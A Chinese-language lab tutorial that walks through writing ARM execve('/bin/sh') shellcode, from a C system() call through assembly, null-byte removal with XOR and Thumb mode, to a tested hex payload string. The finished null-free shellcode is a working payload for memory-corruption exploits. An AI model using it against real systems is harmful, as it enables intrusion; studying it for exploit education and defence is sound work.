# <center>arm下shellcode开发</center>

## 实验概述

### 【目的】
学习在arm进行shellcode
### 【环境】
Linux,arm的qemu
### 【工具】
gdb，as，objdump
### 【原理】
shellcode是一段机器指令，用于在溢出之后改变系统的正常流程，转而执行shellcode从而入侵目标系统。
shellcode基本的编写方式：
- 编写c程序实现功能
- 使用汇编来替代函数调用等
- 汇编编译链接，获取机器码
## 实验步骤

### 【步骤】
先编写一个c语言程序起一个shell。
```c
#include<stdio.h>
int main()
{
    system("/bin/sh");
    return 0;
}
```
用gcc编译
```
$gcc system.c -o system
```
使用strace跟踪程序的函数调用等
```
$strace -v -f ./system
```
可以看到有一段输出为
```c
[pid 16890] execve("/bin/sh", ["sh", "-c", "/bin/sh"], ["INFINALITY_FT_AUTOHINT_HORIZONTA"..., "XDG_SESSION_ID=c2", "INFINALITY_FT_BOLD_EMBOLDEN_X_VA"..., "INFINALITY_FT_AUTOHINT_VERTICAL_"..., "TERM=xterm", "SHELL=/bin/bash", "SSH_CLIENT=10.0.2.2 56290 22", "SSH_TTY=/dev/pts/0", "INFINALITY_FT_CONTRAST=0", "INFINALITY_FT_GRAYSCALE_FILTER_S"..., "USER=pi", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "INFINALITY_FT_FRINGE_FILTER_STRE"..., "INFINALITY_FT_BRIGHTNESS=0", "INFINALITY_FT_USE_VARIOUS_TWEAKS"..., "INFINALITY_FT_GAMMA_CORRECTION=0"..., "MAIL=/var/mail/pi", "PATH=/usr/local/sbin:/usr/local/"..., "PWD=/home/pi", "INFINALITY_FT_FILTER_PARAMS=11 2"..., "LANG=en_GB.UTF-8", "INFINALITY_FT_USE_KNOWN_SETTINGS"..., "INFINALITY_FT_STEM_SNAPPING_SLID"..., "INFINALITY_FT_WINDOWS_STYLE_SHAR"..., "INFINALITY_FT_CHROMEOS_STYLE_SHA"..., "INFINALITY_FT_AUTOHINT_SNAP_STEM"..., "INFINALITY_FT_STEM_ALIGNMENT_STR"..., "SHLVL=1", "HOME=/home/pi", "INFINALITY_FT_BOLD_EMBOLDEN_Y_VA"..., "INFINALITY_FT_GLOBAL_EMBOLDEN_Y_"..., "LOGNAME=pi", "SSH_CONNECTION=10.0.2.2 56290 10"..., "INFINALITY_FT_STEM_FITTING_STREN"..., "INFINALITY_FT_AUTOHINT_INCREASE_"..., "TEXTDOMAIN=Linux-PAM", "INFINALITY_FT_GLOBAL_EMBOLDEN_X_"..., "XDG_RUNTIME_DIR=/run/user/1000", "OLDPWD=/home/pi/ARM-challenges", "_=/usr/bin/strace"]) = 0
```
可以发现，system()实际调用了execve()。
我们可以通过man命令查看execve()的细节。
```
$man execve
```
```c
EXECVE(2)                  Linux Programmer's Manual                 EXECVE(2)

NAME
       execve - execute program

SYNOPSIS
       #include <unistd.h>

       int execve(const char *filename, char *const argv[],
                  char *const envp[]);

....
```

execve()需要的参数是：
- 指向指定二进制文件路径的字符串指针
- argv[]
- envp[]

这里，"/bin/sh"显然是必须的，我们可以调用execve("/bin/sh",0,0)来完成功能

获取execve()的系统调用号
```c
pi@raspberrypi:~ $ grep execve /usr/include/arm-linux-gnueabihf/asm/unistd.h 
#define __NR_execve			(__NR_SYSCALL_BASE+ 11)

```
可以看到execve()的系统调用号为11，在arm汇编中R7寄存器用于传递系统调用号。

在arm中，系统调用的步骤为：
- 将参数送到 R0，R1，。。。
- 将系统调用号送入 R7
- SVC#0或SVC#1
- 用R0传递返回值

现在，我们可以写出arm汇编的代码
```
.section .text
.global _start

_start:
    add     r0,pc,#12
    mov     r1,#0
    mov     r2,#0
    mov     r7,#11
    svc     #0

    .ascii  "/bin/sh\0"
```

查看程序的反汇编

```
$ as system.s -o system.o

$ objdump -d system.o

system.o:     file format elf32-littlearm


Disassembly of section .text:

00000000 <_start>:
   0:	e28f000c 	add	r0, pc, #12
   4:	e3a01000 	mov	r1, #0
   8:	e3a02000 	mov	r2, #0
   c:	e3a0700b 	mov	r7, #11
  10:	ef000000 	svc	0x00000000
  14:	6e69622f 	.word	0x6e69622f
  18:	0068732f 	.word	0x0068732f

```
现在的机器码还是无法使用的，我们需要剔除里面"\x00"。

使用异或操作代替#0立即数的使用，启用thumb模式使代码更紧凑。
```
.section .text
.global  _start
_start:
    .code   32
    add     r3,pc,#1
    bx      r3

    .code   16
    add     r0,pc,#8
    eor     r1,r1,r1
    eor     r2,r2,r2
    mov     r7,#11
    svc     #1
    mov     r5,r5

    .ascii "/bin/sh\0"
```

```
$ as execve.s -o execve.o
pi@raspberrypi:~ $ objdump -d execve.o

execve.o:     file format elf32-littlearm


Disassembly of section .text:

00000000 <_start>:
   0:	e28f3001 	add	r3, pc, #1
   4:	e12fff13 	bx	r3
   8:	a002      	add	r0, pc, #8	; (adr r0, 14 <_start+0x14>)
   a:	4049      	eors	r1, r1
   c:	4052      	eors	r2, r2
   e:	270b      	movs	r7, #11
  10:	df01      	svc	1
  12:	1c2d      	adds	r5, r5, #0
  14:	6e69622f 	.word	0x6e69622f
  18:	0068732f 	.word	0x0068732f

```
可以看到机器码中仍然有"\x00"，位于"/bin/sh\0"的末尾，这里我们可以用任意字符替换"\x00"，并且用置空的寄存器替换字符串末尾的字符。
```
.section .text
.global  _start
_start:
    .code   32
    add     r3,pc,#1
    bx      r3

    .code   16
    add     r0,pc,#8
    eor     r1,r1,r1
    eor     r2,r2,r2
    strb    r2,[r0,#7]
    mov     r7,#11
    svc     #1

    .ascii "/bin/sh\x"
```

```
$ as execve2.s -o execve2.o && ld -N execve2.o -o execve2
pi@raspberrypi:~ $ objdump -d execve2.o

execve2.o:     file format elf32-littlearm


Disassembly of section .text:

00000000 <_start>:
   0:	e28f3001 	add	r3, pc, #1
   4:	e12fff13 	bx	r3
   8:	a002      	add	r0, pc, #8	; (adr r0, 14 <_start+0x14>)
   a:	4049      	eors	r1, r1
   c:	4052      	eors	r2, r2
   e:	71c2      	strb	r2, [r0, #7]
  10:	270b      	movs	r7, #11
  12:	df01      	svc	1
  14:	6e69622f 	.word	0x6e69622f
  18:	7868732f 	.word	0x7868732f

```
可以看到已经不存在"\x00"了，尝试运行程序，看看能不能弹shell出来
```
pi@raspberrypi:~ $ ./execve2 
$ whoami
pi
$ 
```

然后提取十六进制shellcode
```
pi@raspberrypi:~ $ objcopy -O binary execve2 execve2.bin
pi@raspberrypi:~ $  hexdump -v -e '"\\""x" 1/1 "%02x" ""' execve2.bin
\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78
```
完成
### 【总结】
本次实验主要熟悉了使用arm汇编开发shellcode的过程。
